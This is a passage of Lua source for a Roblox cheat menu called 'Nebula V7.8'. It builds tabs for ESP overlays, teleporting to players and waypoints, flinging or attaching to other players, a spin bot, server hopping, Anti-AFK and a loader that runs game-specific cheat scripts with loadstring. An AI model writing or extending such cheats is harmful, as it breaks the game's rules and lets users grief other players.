    end)
end
createButton("Instant Respawn", respawnPlayer, MeContent)

createLabel("ESP OPTIONS", ESPContent)
local _, SetESPToggle, ToggleESP = createToggle("Enable ESP", false, function(enabled)
    V.ESP = enabled
    refreshESP()
end, ESPContent, "ESP")
createToggle("Local ESP (Self)", false, function(enabled)
    V.ESPSelf = enabled
    if V.ESP then
        if enabled then
            createESPForPlayer(LocalPlayer)
        else
            if V.ESPObjects[LocalPlayer] then
                if V.ESPObjects[LocalPlayer].conn then V.ESPObjects[LocalPlayer].conn:Disconnect() end
                if V.ESPObjects[LocalPlayer].box then V.ESPObjects[LocalPlayer].box:Destroy() end
                if V.ESPObjects[LocalPlayer].nameLabel then V.ESPObjects[LocalPlayer].nameLabel:Destroy() end
                if V.ESPObjects[LocalPlayer].distLabel then V.ESPObjects[LocalPlayer].distLabel:Destroy() end
                if V.ESPObjects[LocalPlayer].highlight then V.ESPObjects[LocalPlayer].highlight:Destroy() end
                V.ESPObjects[LocalPlayer] = nil
            end
        end
    end
end, ESPContent, "ESPSelf")
createToggle("Box", false, function(enabled) V.ESPBox = enabled end, ESPContent, "ESPBox")
createToggle("Filled Box (Glow)", false, function(enabled) V.ESPFilled = enabled end, ESPContent, "ESPFilled")
createToggle("Name", false, function(enabled) V.ESPName = enabled end, ESPContent, "ESPName")
createToggle("Distance", false, function(enabled) V.ESPDist = enabled end, ESPContent, "ESPDist")

createLabel("COLOR PALETTE", ESPContent)
do
    local PaletteFrame = Instance.new("Frame")
    PaletteFrame.Size = UDim2.new(1, 0, 0, 40)
    PaletteFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    PaletteFrame.BorderSizePixel = 0
    PaletteFrame.Parent = ESPContent

    local PaletteCorner = Instance.new("UICorner")
    PaletteCorner.CornerRadius = UDim.new(0, 8)
    PaletteCorner.Parent = PaletteFrame

    local PaletteLayout = Instance.new("UIListLayout")
    PaletteLayout.FillDirection = Enum.FillDirection.Horizontal
    PaletteLayout.Padding = UDim.new(0, 6)
    PaletteLayout.Parent = PaletteFrame

    local PalettePadding = Instance.new("UIPadding")
    PalettePadding.PaddingLeft = UDim.new(0, 10)
    PalettePadding.PaddingTop = UDim.new(0, 7)
    PalettePadding.Parent = PaletteFrame

    local function createPaletteColor(color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 26, 0, 26)
        btn.BackgroundColor3 = color
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.Parent = PaletteFrame

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 4)
        corner.Parent = btn

        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 1
        stroke.Color = Color3.fromRGB(80, 80, 90)
        stroke.Transparency = 0.6
        stroke.Parent = btn

        btn.MouseButton1Click:Connect(function()
            V.ESPColor = color
            notify("ESP", "Color changed", color)
        end)
    end

    createPaletteColor(Color3.fromRGB(255, 60, 60))
    createPaletteColor(Color3.fromRGB(60, 120, 255))
    createPaletteColor(Color3.fromRGB(60, 255, 100))
    createPaletteColor(Color3.fromRGB(255, 255, 255))
    createPaletteColor(Color3.fromRGB(180, 60, 255))
    createPaletteColor(Color3.fromRGB(255, 180, 60))
end

createLabel("WAYPOINTS", TeleportContent)
do
    local WaypointInputFrame = Instance.new("Frame")
    WaypointInputFrame.Size = UDim2.new(1, 0, 0, 40)
    WaypointInputFrame.BackgroundColor3 = Color3.fromRGB(20,20, 25)
    WaypointInputFrame.BorderSizePixel = 0
    WaypointInputFrame.Parent = TeleportContent

    local WaypointInputCorner = Instance.new("UICorner")
    WaypointInputCorner.CornerRadius = UDim.new(0, 8)
    WaypointInputCorner.Parent = WaypointInputFrame

    local WaypointNameBox = Instance.new("TextBox")
    WaypointNameBox.Size = UDim2.new(0.6, 0, 0, 30)
    WaypointNameBox.Position = UDim2.new(0, 8, 0.5, -15)
    WaypointNameBox.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    WaypointNameBox.BorderSizePixel = 0
    WaypointNameBox.PlaceholderText = "Nom du point..."
    WaypointNameBox.PlaceholderColor3 = Color3.fromRGB(90, 90, 100)
    WaypointNameBox.Text = ""
    WaypointNameBox.TextColor3 = Color3.fromRGB(210, 210, 222)
    WaypointNameBox.Font = Enum.Font.GothamMedium
    WaypointNameBox.TextSize = 12
    WaypointNameBox.TextXAlignment = Enum.TextXAlignment.Left
    WaypointNameBox.Parent = WaypointInputFrame

    local WaypointNameBoxCorner = Instance.new("UICorner")
    WaypointNameBoxCorner.CornerRadius = UDim.new(0, 5)
    WaypointNameBoxCorner.Parent = WaypointNameBox

    local WaypointNamePadding = Instance.new("UIPadding")
    WaypointNamePadding.PaddingLeft = UDim.new(0, 8)
    WaypointNamePadding.Parent = WaypointNameBox

    local AddWaypointBtn = Instance.new("TextButton")
    AddWaypointBtn.Size = UDim2.new(0, 70, 0, 30)
    AddWaypointBtn.Position = UDim2.new(1, -78, 0.5, -15)
    AddWaypointBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    AddWaypointBtn.BorderSizePixel = 0
    AddWaypointBtn.Text = "Ajouter"
    AddWaypointBtn.TextColor3 = Color3.fromRGB(195, 195, 208)
    AddWaypointBtn.Font = Enum.Font.GothamMedium
    AddWaypointBtn.TextSize = 11
    AddWaypointBtn.Parent = WaypointInputFrame

    local AddWaypointBtnCorner = Instance.new("UICorner")
    AddWaypointBtnCorner.CornerRadius = UDim.new(0, 5)
    AddWaypointBtnCorner.Parent = AddWaypointBtn

    local WaypointList = Instance.new("ScrollingFrame")
    WaypointList.Size = UDim2.new(1, 0, 1, -55)
    WaypointList.Position = UDim2.new(0, 0, 0, 45)
    WaypointList.BackgroundTransparency = 1
    WaypointList.CanvasSize = UDim2.new(0, 0, 0, 0)
    WaypointList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    WaypointList.ScrollBarThickness = 2
    WaypointList.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 55)
    WaypointList.Parent = TeleportContent

    local WaypointListLayout = Instance.new("UIListLayout")
    WaypointListLayout.Padding = UDim.new(0, 5)
    WaypointListLayout.Parent = WaypointList

    local wpCounter = 1
    local function refreshWaypointList()
        for _, child in pairs(WaypointList:GetChildren()) do
            if child:IsA("Frame") then child:Destroy() end
        end
        for wpName, wpData in pairs(Nebula.TeleportPoints) do
            local wpFrame = Instance.new("Frame")
            wpFrame.Size = UDim2.new(1, 0, 0, 38)
            wpFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
            wpFrame.BorderSizePixel = 0
            wpFrame.Parent = WaypointList

            local wpFrameCorner = Instance.new("UICorner")
            wpFrameCorner.CornerRadius = UDim.new(0, 8)
            wpFrameCorner.Parent = wpFrame

            local wpLabel = Instance.new("TextLabel")
            wpLabel.Size = UDim2.new(0.5, 0, 1, 0)
            wpLabel.Position = UDim2.new(0, 14, 0, 0)
            wpLabel.BackgroundTransparency = 1
            wpLabel.Text = wpData.Name
            wpLabel.TextColor3 = Color3.fromRGB(195, 195, 208)
            wpLabel.Font = Enum.Font.GothamMedium
            wpLabel.TextSize = 12
            wpLabel.TextXAlignment = Enum.TextXAlignment.Left
            wpLabel.Parent = wpFrame

            local tpBtn = Instance.new("TextButton")
            tpBtn.Size = UDim2.new(0, 55, 0, 26)
            tpBtn.Position = UDim2.new(1, -130, 0.5, -13)
            tpBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
            tpBtn.BorderSizePixel = 0
            tpBtn.Text = "TP"
            tpBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
            tpBtn.Font = Enum.Font.GothamMedium
            tpBtn.TextSize = 10
            tpBtn.Parent = wpFrame

            local tpBtnCorner = Instance.new("UICorner")
            tpBtnCorner.CornerRadius = UDim.new(0, 5)
            tpBtnCorner.Parent = tpBtn

            tpBtn.MouseButton1Click:Connect(function()
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.CFrame = CFrame.new(wpData.Position)
                    notify("Teleport", "Teleported to " .. wpData.Name, Color3.fromRGB(80, 200, 120))
                end
            end)

            local delBtn = Instance.new("TextButton")
            delBtn.Size = UDim2.new(0, 60, 0, 26)
            delBtn.Position = UDim2.new(1, -65, 0.5, -13)
            delBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
            delBtn.BorderSizePixel = 0
            delBtn.Text = "Delete"
            delBtn.TextColor3 = Color3.fromRGB(170, 110, 110)
            delBtn.Font = Enum.Font.GothamMedium
            delBtn.TextSize = 10
            delBtn.Parent = wpFrame

            local delBtnCorner = Instance.new("UICorner")
            delBtnCorner.CornerRadius = UDim.new(0, 5)
            delBtnCorner.Parent = delBtn

            delBtn.MouseButton1Click:Connect(function()
                Nebula.TeleportPoints[wpName] = nil
                refreshWaypointList()
                notify("Teleport", "Deleted " .. wpData.Name, Color3.fromRGB(255, 90, 90))
            end)
        end
    end

    AddWaypointBtn.MouseButton1Click:Connect(function()
        local name = WaypointNameBox.Text
        if name == "" then
            name = "Point_" .. wpCounter
            wpCounter = wpCounter + 1
        end
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            Nebula.TeleportPoints[name .. "_" .. tostring(os.clock())] = {Position = char.HumanoidRootPart.Position, Name = name}
            WaypointNameBox.Text = ""
            refreshWaypointList()
            notify("Teleport", "Waypoint '" .. name .. "' added!", Color3.fromRGB(80, 200, 120))
        end
    end)
end

createLabel("JOUEURS", JoueurContent)
do
    local SearchBox = Instance.new("TextBox")
    SearchBox.Size = UDim2.new(1, 0, 0, 34)
    SearchBox.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    SearchBox.BorderSizePixel = 0
    SearchBox.PlaceholderText = "Rechercher un joueur..."
    SearchBox.PlaceholderColor3 = Color3.fromRGB(90, 90, 100)
    SearchBox.Text = ""
    SearchBox.TextColor3 = Color3.fromRGB(210, 210, 222)
    SearchBox.Font = Enum.Font.GothamMedium
    SearchBox.TextSize = 12
    SearchBox.TextXAlignment = Enum.TextXAlignment.Left
    SearchBox.Parent = JoueurContent

    local SearchPadding = Instance.new("UIPadding")
    SearchPadding.PaddingLeft = UDim.new(0, 10)
    SearchPadding.Parent = SearchBox

    local SearchCorner = Instance.new("UICorner")
    SearchCorner.CornerRadius = UDim.new(0, 6)
    SearchCorner.Parent = SearchBox

    local PlayerList = Instance.new("ScrollingFrame")
    PlayerList.Size = UDim2.new(1, 0, 1, -45)
    PlayerList.BackgroundTransparency = 1
    PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
    PlayerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    PlayerList.ScrollBarThickness = 2
    PlayerList.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 55)
    PlayerList.Parent = JoueurContent

    local PlayerListLayout = Instance.new("UIListLayout")
    PlayerListLayout.Padding = UDim.new(0, 5)
    PlayerListLayout.Parent = PlayerList

    local function teleportToPlayer(targetPlayer)
        pcall(function()
            local targetChar = targetPlayer.Character
            if not targetChar then return end
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            if not targetRoot then return end
            local root = getRoot()
            root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 3, 0))
            notify("Teleport", "Teleported to " .. targetPlayer.Name, Color3.fromRGB(80, 200, 120))
        end)
    end

    local function startAttach(player)
        if V.Attached then
            if V.AttachConn then V.AttachConn:Disconnect() end
        end
        V.Attached = player
        V.AttachConn = RunService.RenderStepped:Connect(function()
            pcall(function()
                local myChar = LocalPlayer.Character
                local tChar = V.Attached.Character
                if myChar and tChar and myChar:FindFirstChild("HumanoidRootPart") and tChar:FindFirstChild("HumanoidRootPart") then
                    myChar.HumanoidRootPart.CFrame = tChar.HumanoidRootPart.CFrame
                end
            end)
        end)
        addConnection(V.AttachConn)
        notify("Player", "Attached to " .. player.Name, Color3.fromRGB(80, 200, 120))
    end

    local function stopAttach()
        V.Attached = nil
        if V.AttachConn then V.AttachConn:Disconnect() V.AttachConn = nil end
        notify("Player", "Detached", Color3.fromRGB(255, 90, 90))
    end

    local function refreshPlayerList()
        for _, child in pairs(PlayerList:GetChildren()) do
            if child:IsA("Frame") then child:Destroy() end
        end
        local searchTerm = SearchBox.Text:lower()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and (searchTerm == "" or player.Name:lower():find(searchTerm)) then
                local PlayerFrame = Instance.new("Frame")
                PlayerFrame.Size = UDim2.new(1,0, 0, 38)
                PlayerFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
                PlayerFrame.BorderSizePixel = 0
                PlayerFrame.Parent = PlayerList

                local PlayerFrameCorner = Instance.new("UICorner")
                PlayerFrameCorner.CornerRadius = UDim.new(0, 8)
                PlayerFrameCorner.Parent = PlayerFrame

                local PlayerName = Instance.new("TextLabel")
                PlayerName.Size = UDim2.new(0.3, 0, 1, 0)
                PlayerName.Position = UDim2.new(0, 10, 0, 0)
                PlayerName.BackgroundTransparency = 1
                PlayerName.Text = player.Name
                PlayerName.TextColor3 = Color3.fromRGB(195, 195, 208)
                PlayerName.Font = Enum.Font.GothamMedium
                PlayerName.TextSize = 12
                PlayerName.TextXAlignment = Enum.TextXAlignment.Left
                PlayerName.Parent = PlayerFrame

                local TeleportBtn = Instance.new("TextButton")
                TeleportBtn.Size = UDim2.new(0, 50, 0, 26)
                TeleportBtn.Position = UDim2.new(1, -220, 0.5, -13)
                TeleportBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                TeleportBtn.BorderSizePixel = 0
                TeleportBtn.Text = "TP"
                TeleportBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
                TeleportBtn.Font = Enum.Font.GothamMedium
                TeleportBtn.TextSize = 10
                TeleportBtn.Parent = PlayerFrame

                local TeleportBtnCorner = Instance.new("UICorner")
                TeleportBtnCorner.CornerRadius = UDim.new(0, 5)
                TeleportBtnCorner.Parent = TeleportBtn

                TeleportBtn.MouseButton1Click:Connect(function() teleportToPlayer(player) end)

                local SpectateBtn = Instance.new("TextButton")
                SpectateBtn.Size = UDim2.new(0, 50, 0, 26)
                SpectateBtn.Position = UDim2.new(1, -165, 0.5, -13)
                SpectateBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                SpectateBtn.BorderSizePixel = 0
                SpectateBtn.Text = "Spec"
                SpectateBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
                SpectateBtn.Font = Enum.Font.GothamMedium
                SpectateBtn.TextSize = 10
                SpectateBtn.Parent = PlayerFrame

                local SpectateBtnCorner = Instance.new("UICorner")
                SpectateBtnCorner.CornerRadius = UDim.new(0, 5)
                SpectateBtnCorner.Parent = SpectateBtn

                if V.Spectate and V.SelPlayer == player then
                    SpectateBtn.Text = "Stop"
                    SpectateBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
                else
                    SpectateBtn.Text = "Spec"
                    SpectateBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                end

                SpectateBtn.MouseButton1Click:Connect(function()
                    if V.Spectate and V.SelPlayer == player then
                        stopSpectate()
                    else
                        if V.Spectate then stopSpectate() end
                        startSpectate(player)
                    end
                    refreshPlayerList()
                end)

                local FlingBtn = Instance.new("TextButton")
                FlingBtn.Size = UDim2.new(0, 50, 0, 26)
                FlingBtn.Position = UDim2.new(1, -110, 0.5, -13)
                FlingBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                FlingBtn.BorderSizePixel = 0
                FlingBtn.Text = "Fling"
                FlingBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
                FlingBtn.Font = Enum.Font.GothamMedium
                FlingBtn.TextSize = 10
                FlingBtn.Parent = PlayerFrame

                local FlingBtnCorner = Instance.new("UICorner")
                FlingBtnCorner.CornerRadius = UDim.new(0, 5)
                FlingBtnCorner.Parent = FlingBtn

                if V.Flinging and V.FlingTarget == player then
                    FlingBtn.Text = "Stop"
                    FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
                else
                    FlingBtn.Text = "Fling"
                    FlingBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                end

                FlingBtn.MouseButton1Click:Connect(function()
                    if V.Flinging and V.FlingTarget == player then
                        stopFling()
                    else
                        if V.Flinging then stopFling() end
                        startFling(player)
                    end
                    refreshPlayerList()
                end)

                local AttachBtn = Instance.new("TextButton")
                AttachBtn.Size = UDim2.new(0, 50, 0, 26)
                AttachBtn.Position = UDim2.new(1, -55, 0.5, -13)
                AttachBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                AttachBtn.BorderSizePixel = 0
                AttachBtn.Text = "Attach"
                AttachBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
                AttachBtn.Font = Enum.Font.GothamMedium
                AttachBtn.TextSize = 10
                AttachBtn.Parent = PlayerFrame

                local AttachBtnCorner = Instance.new("UICorner")
                AttachBtnCorner.CornerRadius = UDim.new(0, 5)
                AttachBtnCorner.Parent = AttachBtn

                if V.Attached == player then
                    AttachBtn.Text = "Detach"
                    AttachBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
                else
                    AttachBtn.Text = "Attach"
                    AttachBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                end

                AttachBtn.MouseButton1Click:Connect(function()
                    if V.Attached == player then
                        stopAttach()
                    else
                        startAttach(player)
                    end
                    refreshPlayerList()
                end)
            end
        end
    end

    SearchBox:GetPropertyChangedSignal("Text"):Connect(refreshPlayerList)
    Players.PlayerAdded:Connect(refreshPlayerList)
    Players.PlayerRemoving:Connect(refreshPlayerList)
    _G.refreshPlayerList = refreshPlayerList
    refreshPlayerList()
end

createLabel("SERVER ACTIONS", ServerContent)
createButton("Rejoin Server", function()
    notify("Server", "Rejoining server...", Color3.fromRGB(180, 180, 195))
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end, ServerContent)

createButton("Server Hop (Random)", function()
    notify("Server", "Hopping server...", Color3.fromRGB(180, 180, 195))
    pcall(function()
        local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
        for _, v in ipairs(servers.data) do
            if v.playing < v.maxPlayers and v.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, v.id, LocalPlayer)
                return
            end
        end
        notify("Server", "No other server found.", Color3.fromRGB(255, 165, 0))
    end)
end, ServerContent)

createLabel("TIME & VISUALS", ServerContent)
createSlider("Time (0-24h)", 0, 24, 14, function(val)
    Lighting.ClockTime = val
end, ServerContent)

createToggle("Fullbright", false, function(enabled) toggleFullbright(enabled) end, ServerContent, "Fullbright")
createToggle("FPS Booster (Max Boost)", false, function(enabled) toggleFPSBooster(enabled) end, ServerContent, "FPSBoost")

createLabel("CAMERA", ServerContent)
createToggle("Force First Person", false, function(enabled)
    if enabled then
        LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    else
        LocalPlayer.CameraMode = Enum.CameraMode.Classic
    end
    notify("Server", "First Person " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, ServerContent, "Force1st")

createToggle("Force Third Person", false, function(enabled)
    if enabled then
        LocalPlayer.CameraMode = Enum.CameraMode.Classic
        LocalPlayer.CameraMinZoomDistance = 10
    else
        LocalPlayer.CameraMinZoomDistance = 0.5
    end
    notify("Server", "Third Person " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, ServerContent, "Force3rd")

createToggle("Unlock Camera Zoom", false, function(enabled)
    if enabled then
        LocalPlayer.CameraMaxZoomDistance = 1000
        LocalPlayer.CameraMinZoomDistance = 0.5
    else
        LocalPlayer.CameraMaxZoomDistance = 128
        LocalPlayer.CameraMinZoomDistance = 0.5
    end
    notify("Server", "Zoom Unlock " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, ServerContent, "UnlockZoom")

createLabel("TROLL", FunContent)
createToggle("Click TP (Épée)", false, function(enabled) toggleClickTP(enabled) end, FunContent, "ClickTP")

createSlider("Spin Bot Speed", 10, 1000, 100, function(val) V.SpinSpeed = val end, FunContent, "SpinSpeed")
createToggle("Spin Bot (Toupie)", false, function(enabled)
    V.Spin = enabled
    if enabled then
        local char = LocalPlayer.Character
        local humanoid = char and char:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.AutoRotate = false end

        V.SpinConn = RunService.Heartbeat:Connect(function(dt)
            pcall(function()
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local spinAngle = math.rad(V.SpinSpeed * dt * 10)
                    hrp.CFrame = hrp.CFrame * CFrame.Angles(0, spinAngle, 0)
                end
            end)
        end)
        addConnection(V.SpinConn)
        notify("Fun", "Spin Bot ON", Color3.fromRGB(80, 200, 120))
    else
        if V.SpinConn then V.SpinConn:Disconnect() V.SpinConn = nil end
        pcall(function()
            local char = LocalPlayer.Character
            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
            if humanoid then humanoid.AutoRotate = true end
        end)
        notify("Fun", "Spin Bot OFF", Color3.fromRGB(255, 90, 90))
    end
end, FunContent, "Spin")

createLabel("PRE-MADE SCRIPTS", ScriptsContent)
do
    local ScriptScroll = Instance.new("ScrollingFrame")
    ScriptScroll.Size = UDim2.new(1, 0, 1, -30)
    ScriptScroll.Position = UDim2.new(0, 0, 0, 30)
    ScriptScroll.BackgroundTransparency = 1
    ScriptScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    ScriptScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ScriptScroll.ScrollBarThickness = 2
    ScriptScroll.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 55)
    ScriptScroll.Parent = ScriptsContent

    local ScriptListLayout = Instance.new("UIListLayout")
    ScriptListLayout.Padding = UDim.new(0, 5)
    ScriptListLayout.Parent = ScriptScroll

    local ScriptsList = {
        { 
            Name = "Flick", 
            Code = flick_script, 
            Destroy = function() 
                if _G.Nebula_HitboxConn then _G.Nebula_HitboxConn:Disconnect() _G.Nebula_HitboxConn = nil end 
                for _, p in pairs(Players:GetPlayers()) do
                    if p.Character and p.Character:FindFirstChild("Head") then
                        local h = p.Character.Head
                        h.Size = Vector3.new(2,1,1)
                        h.Transparency = 0
                        h.CanCollide = false
                    end
                end
            end 
        },
        { 
            Name = "Murder Mystery",
            Code = murder_mystery, 
            Destroy = function() 
                if _G.Nebula_AutoClickConn then _G.Nebula_AutoClickConn:Disconnect() _G.Nebula_AutoClickConn = nil end 
            end 
        },
        { 
            Name = "Grow Garden 2", 
            Code = grow_garden, 
            Destroy = function() 
                if _G.Nebula_OrigFogEnd then
                    Lighting.FogEnd = _G.Nebula_OrigFogEnd
                    Lighting.FogStart = _G.Nebula_OrigFogStart
                else
                    Lighting.FogEnd = 100000
                    Lighting.FogStart = 0
                end
            end 
        },
        { 
            Name = "Tsunami Brainrot", 
            Code = tsunami_brainrot, 
            Destroy = function() 
                if _G.Nebula_NoNameConn then _G.Nebula_NoNameConn:Disconnect() _G.Nebula_NoNameConn = nil end 
                for _, p in pairs(Players:GetPlayers()) do
                    if p.Character and p.Character:FindFirstChild("Humanoid") then
                        p.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
                    end
                end
            end 
        }
    }

    for _, scriptData in ipairs(ScriptsList) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 38)
        row.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
        row.BorderSizePixel = 0
        row.Parent = ScriptScroll

        local rowCorner = Instance.new("UICorner")
        rowCorner.CornerRadius = UDim.new(0, 8)
        rowCorner.Parent = row

        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0.4, 0, 1, 0)
        lbl.Position = UDim2.new(0, 14, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = scriptData.Name
        lbl.TextColor3 = Color3.fromRGB(195, 195, 208)
        lbl.Font = Enum.Font.GothamMedium
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row

        local loadBtn = Instance.new("TextButton")
        loadBtn.Size = UDim2.new(0, 60, 0, 26)
        loadBtn.Position = UDim2.new(1, -130, 0.5, -13)
        loadBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
        loadBtn.BorderSizePixel = 0
        loadBtn.Text = "Load"
        loadBtn.TextColor3 = Color3.fromRGB(195, 195, 208)
        loadBtn.Font = Enum.Font.GothamMedium
        loadBtn.TextSize = 11
        loadBtn.Parent = row

        local loadCorner = Instance.new("UICorner")
        loadCorner.CornerRadius = UDim.new(0, 5)
        loadCorner.Parent = loadBtn

        local destBtn = Instance.new("TextButton")
        destBtn.Size = UDim2.new(0, 60, 0, 26)
        destBtn.Position = UDim2.new(1, -65, 0.5, -13)
        destBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
        destBtn.BorderSizePixel = 0
        destBtn.Text = "Destroy"
        destBtn.TextColor3 = Color3.fromRGB(170, 110, 110)
        destBtn.Font = Enum.Font.GothamMedium
        destBtn.TextSize = 10
        destBtn.Parent = row

        local destCorner = Instance.new("UICorner")
        destCorner.CornerRadius = UDim.new(0, 5)
        destCorner.Parent = destBtn

        loadBtn.MouseButton1Click:Connect(function()
            pcall(function()
                loadstring(scriptData.Code)()
            end)
            notify("Scripts", scriptData.Name .. " loaded!", Color3.fromRGB(80, 200, 120))
        end)

        destBtn.MouseButton1Click:Connect(function()
            pcall(scriptData.Destroy)
            notify("Scripts", scriptData.Name .. " destroyed!", Color3.fromRGB(255, 90, 90))
        end)
    end
end

createLabel("SYSTEM", SettingsContent)
createToggle("Anti-AFK", false, function(enabled)
    V.AntiAFK = enabled
    if enabled then
        local VirtualUser = game:GetService("VirtualUser")
        local conn = LocalPlayer.Idled:Connect(function()
            if V.AntiAFK then
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end
        end)
        addConnection(conn)
    end
    notify("Settings", "Anti-AFK " .. (enabled and "ON" or "OFF"), enabled and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(255, 90, 90))
end, SettingsContent, "AntiAFK")

createToggle("Notifications", true, function(enabled)
    V.Notif = enabled
    if enabled then
        notify("Settings", "Notifications ON", Color3.fromRGB(80, 200, 120))
    end
end, SettingsContent, "Notif")

do
    local WatermarkFrame = Instance.new("Frame")
    WatermarkFrame.Size = UDim2.new(0, 180, 0, 60)
    WatermarkFrame.Position = UDim2.new(0, 10, 0, 10)
    WatermarkFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 17)
    WatermarkFrame.BackgroundTransparency = 0.1
    WatermarkFrame.BorderSizePixel = 0
    WatermarkFrame.Visible = false
    WatermarkFrame.Parent = ScreenGui

    local WatermarkCorner = Instance.new("UICorner")
    WatermarkCorner.CornerRadius = UDim.new(0, 6)
    WatermarkCorner.Parent = WatermarkFrame

    local WatermarkLabel = Instance.new("TextLabel")
    WatermarkLabel.Size = UDim2.new(1, -10, 1, -10)
    WatermarkLabel.Position = UDim2.new(0, 5, 0, 5)
    WatermarkLabel.BackgroundTransparency = 1
    WatermarkLabel.Text = "Nebula V7.8\nFPS: 0\nPing: 0ms\nPlayers: 0"
    WatermarkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    WatermarkLabel.Font = Enum.Font.GothamMedium
    WatermarkLabel.TextSize = 12
    WatermarkLabel.TextXAlignment = Enum.TextXAlignment.Left
    WatermarkLabel.TextYAlignment = Enum.TextYAlignment.Top
    WatermarkLabel.Parent = WatermarkFrame

    createToggle("Watermark (HUD)", false, function(enabled)
        V.Watermark = enabled
        WatermarkFrame.Visible = enabled
        if enabled then
            notify("Settings", "Watermark ON", Color3.fromRGB(80, 200, 120))
        end
    end, SettingsContent, "Watermark")

    task.spawn(function()
        while task.wait(0.5) do
            if V.Watermark then
                local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
                local playerCount = #Players:GetPlayers()
                WatermarkLabel.Text = string.format("Nebula V7.8\nFPS: %d\nPing: %d ms\nPlayers: %d", currentFPS, ping, playerCount)
            end
        end
    end)
end

do
    local MenuKeybindFrame = Instance.new("Frame")
    MenuKeybindFrame.Size = UDim2.new(1, 0, 0, 40)
    MenuKeybindFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    MenuKeybindFrame.BorderSizePixel = 0
    MenuKeybindFrame.Parent = SettingsContent

    local MenuKeybindCorner = Instance.new("UICorner")
    MenuKeybindCorner.CornerRadius = UDim.new(0, 8)
    MenuKeybindCorner.Parent = MenuKeybindFrame

    local MenuKeyLabel = Instance.new("TextLabel")
    MenuKeyLabel.Size = UDim2.new(0.6, 0, 1, 0)
    MenuKeyLabel.Position = UDim2.new(0, 14, 0, 0)
    MenuKeyLabel.BackgroundTransparency = 1
    MenuKeyLabel.Text = "Menu Toggle Key"
    MenuKeyLabel.TextColor3 = Color3.fromRGB(195, 195, 208)
    MenuKeyLabel.Font = Enum.Font.GothamMedium
    MenuKeyLabel.TextSize = 13
    MenuKeyLabel.TextXAlignment = Enum.TextXAlignment.Left
    MenuKeyLabel.Parent = MenuKeybindFrame

    local MenuKeyBtn = Instance.new("TextButton")
    MenuKeyBtn.Size = UDim2.new(0, 80, 0, 26)
    MenuKeyBtn.Position = UDim2.new(1, -94, 0.5, -13)
    MenuKeyBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    MenuKeyBtn.BorderSizePixel = 0
    MenuKeyBtn.Text = Keybinds.Menu.Name
